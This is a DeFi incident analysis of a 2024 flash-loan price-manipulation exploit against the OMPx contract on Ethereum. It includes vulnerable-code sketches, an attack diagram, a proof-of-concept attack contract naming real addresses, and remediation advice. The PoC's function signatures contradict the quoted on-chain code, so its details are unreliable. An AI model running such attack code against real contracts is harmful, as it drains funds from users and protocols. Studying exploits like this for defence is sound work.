# OMPx Contract — Price Manipulation via Repeated purchase/buyBack Analysis

| Field | Details |
|------|------|
| **Date** | 2024-08-25 |
| **Protocol** | OMPx Contract |
| **Chain** | Ethereum |
| **Loss** | ~4.37 ETH (~11,527 USD) |
| **Attacker** | Address unconfirmed |
| **Attack Tx** | Address unconfirmed |
| **Vulnerable Contract** | [0x09A80172ED7335660327cD664876b5df6FE06108](https://etherscan.io/address/0x09A80172ED7335660327cD664876b5df6FE06108) |
| **Root Cause** | `purchase()`/`buyBack()` functions calculate exchange rate based on internal ETH balance — repeated calls accumulate rate imbalance enabling arbitrage profit |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-08/OMPxContract_exp.sol) |

---

## 1. Vulnerability Overview

The OMPx contract exposed a `purchase()` function for buying OMPX tokens with ETH, and a `buyBack()` function for selling OMPX in exchange for ETH. Both functions lacked price validation within a single block. The attacker borrowed 100 WETH via a Balancer flash loan, then called `purchase()` and `buyBack()` in a loop 7 times, exploiting the price imbalance to realize a net profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: no flash loan or repeated-call protection in purchase/buyBack
function purchase() external payable {
    uint256 ompxAmount = msg.value * getPrice();  // ❌ Minted based on spot price
    IERC20(OMPX).mint(msg.sender, ompxAmount);
}

function buyBack(uint256 ompxAmount) external {
    uint256 ethAmount = ompxAmount / getPrice();  // ❌ Refunded based on spot price
    IERC20(OMPX).burn(msg.sender, ompxAmount);
    payable(msg.sender).transfer(ethAmount);
}

// ✅ Correct code: prevent repeated calls within the same block
mapping(address => uint256) public lastPurchaseBlock;

function purchase() external payable {
    require(block.number > lastPurchaseBlock[msg.sender], "One tx per block");  // ✅ Block limit
    lastPurchaseBlock[msg.sender] = block.number;
    uint256 ompxAmount = msg.value * getTWAPPrice();  // ✅ Use TWAP
    IERC20(OMPX).mint(msg.sender, ompxAmount);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: OMPxContract.sol
    function purchase(uint256 tokensToPurchase, uint256 maxPrice) public payable returns(uint256 tokensBought_) {  // ❌ Vulnerability
        require(tokensToPurchase > 0);
        require(msg.value > 0);
        return purchaseSafe(tokensToPurchase, maxPrice);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► Balancer Flash Loan: borrow 100 WETH
  │
  ├─[2]─► Convert WETH → ETH
  │
  ├─[3]─► 7-iteration loop:
  │         ├─► purchase(): buy OMPX at current price
  │         └─► buyBack(): receive ETH refund exploiting price imbalance
  │               └─► small price discrepancy accumulates each iteration
  │
  ├─[4]─► Convert accumulated profit ETH → WETH
  │
  ├─[5]─► Repay Balancer flash loan (including fee)
  │
  └─[6]─► Total loss: ~4.37 ETH
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackContract {
    address constant OMPX = 0x09A80172ED7335660327cD664876b5df6FE06108;
    IERC20 constant OMPX_TOKEN = IERC20(0x633B041C41f61D04089880D7B5C7ED0F10fF6f85);

    function receiveFlashLoan(
        address[] memory, uint256[] memory amounts, uint256[] memory, bytes memory
    ) external {
        // [2] WETH → ETH
        IWETH(WETH).withdraw(amounts[0]);

        // [3] Repeat purchase/buyBack 7 times
        for (uint256 i = 0; i < 7; i++) {
            // purchase: buy OMPX with ETH
            IOMPx(OMPX).purchase{value: address(this).balance / 2}();

            // buyBack: redeem OMPX for ETH (exploiting price imbalance)
            uint256 ompxBal = OMPX_TOKEN.balanceOf(address(this));
            OMPX_TOKEN.approve(OMPX, ompxBal);
            IOMPx(OMPX).buyBack(ompxBal);
        }

        // [4] Convert ETH → WETH then repay flash loan
        IWETH(WETH).deposit{value: address(this).balance}();
        IWETH(WETH).transfer(BALANCER_VAULT, amounts[0]);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Price Manipulation — `purchase()`/`buyBack()` exchange rate calculated from internal ETH balance — repeated calls accumulate rate imbalance enabling arbitrage |
| **Attack Technique** | Repeated Purchase/BuyBack Internal Balance Arbitrage (flash loan serves as auxiliary funding) |
| **DASP Category** | Price Oracle Manipulation |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Severity** | Medium |
| **Attack Complexity** | Medium |

## 6. Remediation Recommendations

1. **Limit to one call per block**: Restrict `purchase()` and `buyBack()` from being called repeatedly within the same block.
2. **Use TWAP pricing**: Replace spot price with TWAP to defend against short-term price manipulation.
3. **Flash loan protection**: Detect and block purchase + buyBack combinations within the same transaction.
4. **Trading fee**: Introduce a spread (fee) between purchase and buyBack to make arbitrage unprofitable.

## 7. Lessons Learned

- **Buy-sell loop pattern**: Purchase/sell functions based on spot price can be exploited for price imbalance via repeated calls within a single transaction.
- **Flash loan accessibility**: Flash loans from Balancer, Aave, etc. enable attackers to execute large-scale attacks without initial capital.
- **Small losses still warrant defense**: 4.37 ETH is a modest amount, but the same vulnerability can be scaled up significantly.